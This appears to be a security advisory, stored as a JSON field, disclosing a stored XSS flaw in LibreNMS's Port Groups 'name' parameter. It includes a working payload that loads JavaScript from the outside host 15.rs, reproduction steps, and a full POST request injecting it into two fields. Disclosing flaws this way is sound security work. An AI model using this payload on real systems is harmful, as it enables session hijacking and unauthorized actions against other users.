    "Description": "### Summary\nA Stored Cross-Site Scripting (XSS) vulnerability in the \"Port Settings\" page allows authenticated users to inject arbitrary JavaScript through the \"name\" parameter when creating a new Port Group. This vulnerability results in the execution of malicious code when the \"Port Settings\" page is visited after the affected Port Group is added to a device, potentially compromising user sessions and allowing unauthorized actions.\n\n### Details\nWhen creating a new \"Port Group,\" an attacker can inject the following XSS payload into the \"name\" parameter:\n```\u003cscript/src=//15.rs\u003e\u003c/script\u003e```\n\nNote: The payload uses the \"15.rs\" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.\n\nThe payload triggers when the affected Port Group is added to a device and the \"Port Settings\" page is reloaded. The vulnerability is due to insufficient sanitization of the \"name\" parameter. The sink responsible for this issue is:\nhttps://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/app/Http/Controllers/Table/EditPortsController.php#L69\n\n### PoC\n1. Create a new Port Group using the following payload in the \"name\" parameter:\n```name\u003cscript/src=//15.rs\u003e\u003c/script\u003e```\n2. Add the Port Group to a device's port settings.\n3. Reload the \"Port Settings\" page.\n4. Observe that the injected script executes.\n\nExample Request:\n```http\nPOST /port-groups HTTP/1.1\nHost: \u003cyour_host\u003e\nContent-Type: application/x-www-form-urlencoded\nCookie: \u003cyour_cookie\u003e\n\n_token=\u003cyour_token\u003e\u0026name=name\u003cscript/src=//15.rs\u003e\u003c/script\u003e\u0026desc=descr\u003cscript/src=//15.rs\u003e\u003c/script\u003e\n```\n\n### Impact\n\nThis vulnerability allows authenticated users to inject and execute arbitrary JavaScript in the context of other users' sessions when they visit the \"Port Settings\" page of a device. This could result in the compromise of user accounts and unauthorized actions performed on their behalf.",
